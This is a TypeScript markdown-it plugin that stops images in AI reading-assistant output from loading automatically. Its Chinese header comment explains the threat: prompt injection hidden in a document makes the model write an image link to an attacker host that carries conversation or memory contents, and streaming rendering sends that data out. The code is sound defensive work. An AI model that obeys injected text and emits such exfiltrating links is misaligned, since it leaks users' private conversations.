import type MarkdownIt from 'markdown-it'

// 模型输出（阅读助手、对话模式、解释、翻译）与更新说明里的图片一律不自动加载（1.2.8 安全）。
// 远程图片的地址可以把对话内容带出去：文档里藏一句提示词注入，模型就会写出
// ![](https://攻击者/?q=<对话或记忆内容>)，流式渲染时 <img> 一出现请求就发出去了。
// 同源的相对路径也不加载（会打到本机服务上）。处理方式：
// - data:image/… 与 blob: 这类本地图片照常显示；
// - http(s) 图片显示成一个链接「[图片：说明]」，点了才交给系统浏览器打开；
// - 其他地址只显示文字。
const escape = (value: string) => value.replace(/[&<>"']/g, char => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[char]!))

export function installSafeImages(markdown: MarkdownIt): void {
  markdown.renderer.rules.image = (tokens, index) => {
    const token = tokens[index]!
    const src = token.attrGet('src') || ''
    const alt = (token.children?.map(child => child.content).join('') || token.content || '').trim() || '图片'
    if (/^data:image\/(png|jpe?g|gif|webp);base64,/i.test(src) || /^blob:/i.test(src)) return `<img src="${escape(src)}" alt="${escape(alt)}">`
    if (/^https?:\/\//i.test(src)) return `<a class="answer-image-link" href="${escape(src)}" target="_blank" rel="noopener noreferrer">[图片：${escape(alt)}]</a>`
    return `<span class="answer-image-link">[图片：${escape(alt)}]</span>`
  }
}
